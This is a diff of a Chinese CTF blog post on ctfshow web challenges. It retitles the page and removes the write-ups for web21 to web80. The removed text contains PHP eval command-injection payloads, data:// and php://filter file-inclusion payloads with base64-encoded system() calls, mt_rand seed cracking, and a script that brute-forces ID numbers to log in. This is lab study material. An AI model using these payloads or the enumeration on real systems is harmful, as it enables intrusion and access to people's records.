@@ -4,7 +4,7 @@
   <meta charset="utf-8">
   <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
   
-  <title>ctfshow-web入门刷题记录 | 大周&#39;blog</title>
+  <title>ctfshow-web入门信息搜集 | 大周&#39;blog</title>
   <meta name="description" content="ctf萌新" />
   <meta name="keywords" content="ctf,菜鸡,萌新,web,Sakura" />
   
@@ -276,7 +276,7 @@
       </div>
     <header class="pattern-header single-header">
       <h1 class="entry-title">
-      ctfshow-web入门刷题记录</h1>
+      ctfshow-web入门信息搜集</h1>
       <p class="entry-census">
         <span>
           <a href="https://www.d1a0.cn" target="_blank" rel="noopener">
@@ -386,293 +386,7 @@ var result=window.confirm(&quot;\u4f60\u8d62\u4e86\uff0c\u53bb\u5e7a\u5e7a\u96f6
 <h3 id="web20"><a href="#web20" class="headerlink" title="web20"></a>web20</h3><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200904152136.png" alt="web20.1"></p>
 <p>这个题是归到爆破了我记得，但是这种类型的年代久远了，用御剑和sqlmap都爆破不出来，是在db目录下的一个mdb文件，/db/db.mdb，下载这个数据库文件后打开就有flag了</p>
 <p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200915200701.png" alt="web20.2"></p>
-<h3 id="web21"><a href="#web21" class="headerlink" title="web21"></a>web21</h3><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200915200836.png" alt="web21.1"></p>
-<p>爆破题，抓包发现传输的账号密码是经过base64加密后的</p>
-<p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200915202210.png" alt="web21.2"></p>
-<p>解出来是这样形式的：admin:admin</p>
-<p>下载题目给的压缩包，解压出字典，写脚本然后用burpsuit跑就行了</p>
-<h3 id="web22"><a href="#web22" class="headerlink" title="web22"></a>web22</h3><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200904153146.png" alt="web22.1"></p>
-<p>说是子域名爆破，但是我觉得就是flag.ctfer.com，你觉得呢…</p>
-<h3 id="web23"><a href="#web23" class="headerlink" title="web23"></a>web23</h3><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200921201534.png" alt="web23.1"></p>
-<p>在各位大佬的指导下搞出来的代码</p>
-<pre><code class="PHP">&lt;?php 
-error_reporting(0); 
 
-$a=&quot;asdfghjklqwertyuiopzxcvbnm1234567890&quot;;
-for($i=0;$i&lt;36;$i++){
-    for($j=0;$j&lt;36;$j++){
-        $token=$a[$i].$a[$j];    
-        $token = md5($token); 
-        if(substr($token, 1,1)===substr($token, 14,1) &amp;&amp; substr($token, 14,1) ===substr($token, 17,1)){ 
-            if((intval(substr($token, 1,1))+intval(substr($token, 14,1))+substr($token, 17,1))/substr($token, 1,1)===intval(substr($token, 31,1))){ 
-                echo $a[$i].$a[$j];
-                exit(0);
-            } 
-        } 
-    }
-} 
-?&gt; </code></pre>
-<h3 id="web24"><a href="#web24" class="headerlink" title="web24"></a>web24</h3><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200917204607.png" alt="web24.1"></p>
-<p>PHP伪随机数</p>
-<pre><code>&lt;?php
-mt_srand(372619038);
-echo(mt_rand());
-?&gt;</code></pre><p>用PHP版本7.2.10运行，将得到的数字传入即可</p>
-<h3 id="web25"><a href="#web25" class="headerlink" title="web25"></a>web25</h3><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200917205952.png" alt></p>
-<p>r=1的时候rand=-1833303828</p>
-<p>mt_rand()=r-rand=1833303829</p>
-<p>然后kali运行脚本./php_mt_seed 1833303829</p>
-<p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200930213544.png" alt="web25.2"></p>
-<p>我用的是第一个php7.1.0+版本的种子然后</p>
-<pre><code>&lt;?php
-mt_srand(399933415);
-echo mt_rand().&quot;\n&quot;;
-echo mt_rand()+mt_rand();</code></pre><p>返回1833303829 1800730406</p>
-<p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200930213708.png" alt="web25.3"></p>
-<p>设置r= 和token=</p>
-<h3 id="web26"><a href="#web26" class="headerlink" title="web26"></a>web26</h3><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200930201911.png" alt="web26.1"></p>
-<p>爆破pass</p>
-<h3 id="web27"><a href="#web27" class="headerlink" title="web27"></a>web27</h3><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200903224458.png" alt="web27.1"></p>
-<p>题目是个正方的教务管理系统，有录取名单和学生学籍信息查询系统两个功能</p>
-<p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200903224628.png" alt="web27.2"></p>
-<p>录取名单下载下来是一份表格，学生学籍信息查询系统要求输入姓名和身份证号码</p>
-<p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200903225120.png" alt="web27.3">这里就用表格里第一个人的信息</p>
-<p>高先伊 身份证号码621022<strong>****</strong>5237</p>
-<p>中年的出生年月日居然不给要自己爆破，这里可以通过检验身份证号码是否合理，筛选符合条件的身份证，可惜我的代码写的太烂，写出来的我自己都不敢看，这里就不贴了，放一个不用检验身份证号码合理性的代码吧（希望服务器没事……）</p>
-<pre><code>for year in range(1990,1993):
-    for month in range(1,13):
-        for day in range(1,32):
-            card = &quot;621022&quot; + str(year) + str(&quot;%02d&quot;%(month)) + str(&quot;%02d&quot;%(day)) + &quot;5237&quot;
-            print(card)</code></pre><p>然后拿着姓名+身份证去学籍信息查询系统爆破，得到正确的身份证号码，然后会弹窗提示学号和默认密码（身份证号）</p>
-<p>登录得到flag</p>
-<p>（还有师傅说去在线生成身份证的网站上输入姓名能直接找到，这比我还狠啊…）</p>
-<h3 id="web28"><a href="#web28" class="headerlink" title="web28"></a>web28</h3><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200930213906.png" alt="web28.1"></p>
-<p>访问之后url是这样的/0/1/2.txt，然后手动尝试访问/0/1.txt之后url被重定向到/0/0/1/0/1/0/1/0/1/0/1/0/1/0/1/0/1/0/1/0/1/0/1/0/1/0/1/0/1/0/1/0/1/0/1/0/1/0/1/2.txt</p>
-<p>刚开始我想的是爆破0和1的各种组合目录，最后啥也爆破不出来，看师傅们的wp才知道是爆破/0-100/0-100/</p>
-<p>爆破/0-100/0-100/就行</p>
-<h3 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h3><pre><code>&lt;?php 
-
-/* 
-\# -*- coding: utf-8 -*- 
-\# @Author: h1xa 
-\# @Date:  2020-09-04 00:12:34 
-\# @Last Modified by:  h1xa 
-\# @Last Modified time: 2020-09-04 00:26:48 
-\# @email: h1xa@ctfer.com 
-\# @link: https://ctfer.com 
-
-*/ 
-
-error_reporting(0); 
-if(isset($_GET[&#39;c&#39;])){ 
-  $c = $_GET[&#39;c&#39;]; 
-  if(!preg_match(&quot;/flag/i&quot;, $c)){ 
-    eval($c); 
-  } 
-
-}else{ 
-  highlight_file(__FILE__); 
-}</code></pre><p>过滤了flag，直接cat *.php</p>
-<p><code>?c=system(‘cat *.php’);</code></p>
-<h3 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h3><pre><code>&lt;?php 
-
-/* 
-\# -*- coding: utf-8 -*- 
-\# @Author: h1xa 
-\# @Date:  2020-09-04 00:12:34 
-\# @Last Modified by:  h1xa 
-\# @Last Modified time: 2020-09-04 00:42:26 
-\# @email: h1xa@ctfer.com 
-\# @link: https://ctfer.com 
-
-*/ 
-
-error_reporting(0); 
-if(isset($_GET[&#39;c&#39;])){ 
-  $c = $_GET[&#39;c&#39;]; 
-  if(!preg_match(&quot;/flag|system|php/i&quot;, $c)){ 
-    eval($c); 
-  } 
-
-}else{ 
-  highlight_file(__FILE__); 
-}</code></pre><p>这次过滤了system，用<code>?c=echo shell_exec(&#39;cat fl``ag.p``hp&#39;);</code></p>
-<p>这里我刚开始用<code>?c=echo exec(&#39;ls&#39;);</code>发现只有index.php，并且<code>?c=echo exec(&#39;cat fl``ag.p``hp&#39;);</code>之后也只有$flag = ‘flag{28bba894-7025-47a3-a269-e98f60f6bfce}’;</p>
-<p>问过羽大佬之后才知道是exec和shell_exec的区别，exec只返回结果的最后一行，而shell_exec返回完整结果。</p>
-<p>参考<a href="http://www.manongjc.com/article/1992.html" target="_blank" rel="noopener">http://www.manongjc.com/article/1992.html</a></p>
-<h3 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h3><pre><code>&lt;?php 
-
-/* 
-\# -*- coding: utf-8 -*- 
-\# @Author: h1xa 
-\# @Date:  2020-09-04 00:12:34 
-\# @Last Modified by:  h1xa 
-\# @Last Modified time: 2020-09-04 00:49:10 
-\# @email: h1xa@ctfer.com 
-\# @link: https://ctfer.com 
-
-*/ 
-
-error_reporting(0); 
-if(isset($_GET[&#39;c&#39;])){ 
-  $c = $_GET[&#39;c&#39;]; 
-  if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#39;/i&quot;, $c)){ 
-    eval($c); 
-  } 
-
-}else{ 
-  highlight_file(__FILE__); 
-}</code></pre><p>过滤了空格和单引号，cat也不能用，用%09代替空格绕过</p>
-<pre><code>?c=echo(`nl%09*`);</code></pre><p>还有几个代替空格的，但是这里没用：${IFS}、$IFS$9、&lt;&gt;、&lt;</p>
-<h3 id="web32-36"><a href="#web32-36" class="headerlink" title="web32-36"></a>web32-36</h3><pre><code>&lt;?php 
-
-/* 
-\# -*- coding: utf-8 -*- 
-\# @Author: h1xa 
-\# @Date:  2020-09-04 00:12:34 
-\# @Last Modified by:  h1xa 
-\# @Last Modified time: 2020-09-04 00:56:31 
-\# @email: h1xa@ctfer.com 
-\# @link: https://ctfer.com 
-
-*/ 
-
-error_reporting(0); 
-if(isset($_GET[&#39;c&#39;])){ 
-  $c = $_GET[&#39;c&#39;]; 
-  if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#39;|\`|echo|\;|\(/i&quot;, $c)){ 
-    eval($c); 
-  } 
-
-}else{ 
-  highlight_file(__FILE__); 
-}</code></pre><p>这次直接连echo都直接过滤了，包括括号也过滤了，php中不用括号的函数有echo、print、die、include、require、include_once、require_once,用include函数和post传伪协议构成payload</p>
-<p>?c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php</p>
-<p>后面的33-37基本都差不多，同一个payload</p>
-<h3 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h3><pre><code>&lt;?php 
-
-/* 
-\# -*- coding: utf-8 -*- 
-\# @Author: h1xa 
-\# @Date:  2020-09-04 00:12:34 
-\# @Last Modified by:  h1xa 
-\# @Last Modified time: 2020-09-04 05:18:55 
-\# @email: h1xa@ctfer.com 
-\# @link: https://ctfer.com 
-*/ 
-
-//flag in flag.php 
-error_reporting(0); 
-if(isset($_GET[&#39;c&#39;])){ 
-  $c = $_GET[&#39;c&#39;]; 
-  if(!preg_match(&quot;/flag/i&quot;, $c)){ 
-    include($c); 
-    echo $flag; 
-
-  } 
-
-}else{ 
-  highlight_file(__FILE__); 
-}</code></pre><p>过滤了flag，然后包含出来，用data协议</p>
-<pre><code>?c=data://text/plain,&lt;?php system(&#39;cat f*&#39;);?&gt;</code></pre><h3 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h3><pre><code>&lt;?php 
-
-/* 
-\# -*- coding: utf-8 -*- 
-\# @Author: h1xa 
-\# @Date:  2020-09-04 00:12:34 
-\# @Last Modified by:  h1xa 
-\# @Last Modified time: 2020-09-04 05:23:36 
-\# @email: h1xa@ctfer.com 
-\# @link: https://ctfer.com 
-*/ 
-
-//flag in flag.php 
-error_reporting(0); 
-if(isset($_GET[&#39;c&#39;])){ 
-  $c = $_GET[&#39;c&#39;]; 
-  if(!preg_match(&quot;/flag|php|file/i&quot;, $c)){ 
-    include($c); 
-    echo $flag; 
-
-  } 
-
-}else{ 
-  highlight_file(__FILE__); 
-}</code></pre><p>  } </p>
-<p>}else{<br>  highlight_file(<strong>FILE</strong>);<br>}</p>
-<p>在37的基础上过滤了php和file，data协议用base64加密一下</p>
-<pre><code>?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZionKTs/Pg==</code></pre><h3 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h3><pre><code>&lt;?php 
-
-/* 
-\# -*- coding: utf-8 -*- 
-\# @Author: h1xa 
-\# @Date:  2020-09-04 00:12:34 
-\# @Last Modified by:  h1xa 
-\# @Last Modified time: 2020-09-04 06:13:21 
-\# @email: h1xa@ctfer.com 
-\# @link: https://ctfer.com 
-*/ 
-
-//flag in flag.php 
-error_reporting(0); 
-if(isset($_GET[&#39;c&#39;])){ 
-  $c = $_GET[&#39;c&#39;]; 
-  if(!preg_match(&quot;/flag/i&quot;, $c)){ 
-    include($c.&quot;.php&quot;); 
-  } 
-
-}else{ 
-  highlight_file(__FILE__); 
-}</code></pre><p>在之前的基础上加了.php后缀</p>
-<pre><code>?c=data://text/plain,&lt;?php system(&#39;cat f*&#39;);?&gt;</code></pre><h3 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h3><pre><code>&lt;?php 
-
-/* 
-\# -*- coding: utf-8 -*- 
-\# @Author: h1xa 
-\# @Date:  2020-09-04 00:12:34 
-\# @Last Modified by:  h1xa 
-\# @Last Modified time: 2020-09-04 06:03:36 
-\# @email: h1xa@ctfer.com 
-\# @link: https://ctfer.com 
-*/ 
-
-
-
-if(isset($_GET[&#39;c&#39;])){ 
-  $c = $_GET[&#39;c&#39;]; 
-  if(!preg_match(&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\&#39;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;, $c)){ 
-    eval($c); 
-  } 
-
-}else{ 
-  highlight_file(__FILE__); 
-} 
-
-</code></pre><p>啥也看不懂，大佬的wp都看不懂，先看羽师傅的wp</p>
-<p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20201015201529.png" alt></p>
-<p>又是看不懂的东西，首先session_start()函数初始化session，然后引用session_id,构造system(ls);</p>
-<p>俺照着试了试确实能行，但是也确实不能cat flag</p>
-<p>如羽师傅所说<code>因为session_id规定为0-9，a-z,A-Z,-中的字符。在5.5以下及7.1以上均无法写入除此之外的内容。但是符合要求的字符还是可以的。</code></p>
-<p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20201015204033.png" alt></p>
-<p>接着看第二个解法读文件+数组改造</p>
-<p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20201015204550.png" alt></p>
-<p>又是一大堆奇奇怪怪的函数，第一个函数localeconv()：查找美国本地的数字格式化信息，返回内容为</p>
-<p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20201015205007.png" alt></p>
-<p>pos()函数：pos()函数是current()函数的别名，它可返回数组中当前元素的值。在这里它返回了</p>
-<p>localeconv()函数返回数组中的第一个元素.</p>
-<p>scandir():列出指定路径中的文件和目录，这里构造的是scandir(.)。</p>
-<p>现在的返回值是</p>
-<p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20201015211313.png" alt></p>
-<p>array_reverse():返回单元顺序相反的数组，这里的作用就是把两个php文件提到前边</p>
-<p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20201015211429.png" alt></p>
-<p>next()：将数组中的内部指针向前移动一位 ，就是把数组中第二个元素提前一位并且返回，在这里是把flag.php提到第一位并返回</p>
-<p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20201015212249.png" alt></p>
-<p>然后highlight_file()函数将flag.php中的内容返回</p>
-<p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20201015212854.png" alt></p>
-<h3 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h3><p>index.php?file=php://filter/read=convert.base64-encode/resource=flag.php</p>
-<h3 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h3><p>index.php?file=data:text/plain;base64,PD9waHAgc3lzdGVtKCJscyIpPz4=</p>
-<p>index.php?file=data:text/plain;base64,PD9waHAgc3lzdGVtKCJubCAqIik/Pg==</p>
-<h3 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h3>
         </div>
         <!-- .entry-content -->
         
@@ -693,9 +407,28 @@ if(isset($_GET[&#39;c&#39;])){
       <div class="toc" style="background: none;"></div>
       <section class="post-squares nextprev">
         
+          
+            <div class="post-nepre half previous">
+          
+            <a href="/2020/11/20/ctfshow-web%E5%85%A5%E9%97%A8%E7%88%86%E7%A0%B4/" rel="prev">
+              <div class="background">
+<!--                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/xbclub/imageCDN//upload/20200306164050.gif" data-src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20201120184619.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20201120184619.jpg">-->
+                
+                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/xbclub/imageCDN//upload/20200306164050.gif" data-src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20201120184619.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" >
+              </div>
+              <span class="label">
+              Previous Post</span>
+              <div class="info">
+                <h3>
+                ctfshow-web入门爆破</h3>
+                <hr>
+              </div>
+            </a>
+          </div>
+        
         
           
-            <div class="post-nepre full next">
+            <div class="post-nepre half next">
           
             <a href="/2020/08/11/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" rel="next">
               <div class="background">
